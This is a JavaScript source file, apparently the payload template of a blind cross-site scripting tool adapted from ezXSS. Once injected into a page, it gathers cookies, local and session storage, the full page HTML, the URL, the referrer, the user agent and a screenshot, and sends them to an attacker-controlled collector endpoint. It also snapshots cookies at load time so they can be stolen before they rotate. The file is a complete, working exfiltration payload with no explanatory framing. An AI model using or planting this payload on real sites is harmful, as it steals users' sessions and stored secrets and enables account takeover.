// Gotch4 — EZ Payload
// Adapted from ezXSS (github.com/ssl/ezXSS)

function ez_n(e){return void 0!==e?e:''}

// Serialize Storage objects properly (fixes ezXSS [object Storage] bug)
function ez_ls(storage){
  try{var o={};for(var i=0;i<storage.length;i++){var k=storage.key(i);o[k]=storage.getItem(k);}return JSON.stringify(o);}catch(e){return'';}
}

// POST captured data to /ez/c
function ez_cb(e,t,o){
  o=void 0!==o?o:0;
  var s,n="{{protocol}}://{{domain}}/ez/c";
  if(window.XMLHttpRequest){s=new XMLHttpRequest;s.open("POST",n,!0);s.setRequestHeader("Content-type","text/plain");}
  else{s=new ActiveXObject("Microsoft.XMLHTTP");s.open("POST",n,!0);s.setRequestHeader("Content-type","application/x-www-form-urlencoded");}
  s.onreadystatechange=function(){
    if(4===s.readyState&&200!==s.status&&0===o){
      var n=e;n.cookies="";n.localstorage="";n.sessionstorage="";n.dom="Error callback: "+s.status;n.screenshot="";
      ez_cb(n,t,1);
    }
  };
  try{s.send(ez_se(e))}catch(n){}
}

// Main collection function
function ez_hL(){
  try{ez_rD.uri=ez_n(location.toString())}catch(t){ez_rD.uri=""}
  try{ez_rD.cookies=ez_n(document.cookie)||ez_rD._cookieSnapshot||""}catch(e){ez_rD.cookies=ez_rD._cookieSnapshot||""}
  try{
    ez_rD.referer=ez_n(document.referrer);
    var u="";
    try{if(window.self!==window.top)u="iFrame loaded via "+window.parent.location;}
    catch(e){u="iFrame loaded via cross-origin";}
    ez_rD.referer+=(ez_rD.referer&&u?" - ":"")+u;
  }catch(o){ez_rD.referer=""}
  try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(r){ez_rD["user-agent"]=""}
  try{ez_rD.origin=ez_n(location.origin)}catch(c){ez_rD.origin=""}
  try{ez_rD.localstorage=ez_ls(window.localStorage)}catch(a){ez_rD.localstorage=""}
  try{ez_rD.sessionstorage=ez_ls(window.sessionStorage)}catch(n){ez_rD.sessionstorage=""}
  try{ez_rD.dom=ez_n(document.documentElement.outerHTML||document.documentElement.innerHTML)}catch(s){ez_rD.dom=""}
  try{ez_rD.payload="{%data payload}"}catch(i){ez_rD.payload=""}
  try{
    if("undefined"!=typeof html2canvas){
      html2canvas(document.body,{"max-width":1920,"max-height":1080})
        .then(function(t){ez_rD.screenshot=ez_n(t.toDataURL());ez_done();})
        .then(void 0,function(){ez_rD.screenshot="";ez_done();});
    }else{ez_rD.screenshot="";ez_done();}
  }catch(h){ez_rD.screenshot="";ez_done();}
}

function ez_done(){ez_s();ez_cb(ez_rD,null);}

// Zero out fields in the noCollect list
function ez_s(){var t,n,o=[{%data noCollect}];for(t=0,n=o.length;t<n;++t)ez_rD[o[t]]="Not collected";}

// JSON serializer (with legacy fallback)
function ez_se(e){
  try{
    if("undefined"!=typeof JSON&&"function"==typeof JSON.stringify)try{return JSON.stringify(e)}catch(e){}
    var n=[];for(var t in e)if(e.hasOwnProperty(t)){var r=e[t];if(null==r)r="";else if("object"==typeof r)try{r=ez_n(r.toString())}catch(e){r="";}else r=ez_n(r);n.push(encodeURIComponent(t)+"="+encodeURIComponent(r));}
    return n.join("&");
  }catch(e){return"";}
}

function ez_a(k,v){if(!ez_rD.extra){ez_rD.extra={};}if(typeof k==='object'&&k!==null){for(var key in k){if(k.hasOwnProperty(key)){ez_rD.extra[key]=k[key];}}}else{ez_rD.extra[k]=v;}}
function ez_aE(t,e,n){t.addEventListener?t.addEventListener(e,n,!1):t.attachEvent&&t.attachEvent("on"+e,n);}

var ez_rD={};
// Snapshot cookies immediately at script parse time — before any page JS can change or clear them.
// ez_hL() may run much later (after window.load), by which time cookies could have rotated.
try{ez_rD._cookieSnapshot=document.cookie;}catch(e){ez_rD._cookieSnapshot="";}
{%data screenshot}

if("complete"===document.readyState)ez_hL();
else{var t=setTimeout(function(){ez_hL();},2e3);ez_aE(window,"load",function(){clearTimeout(t);ez_hL();});}
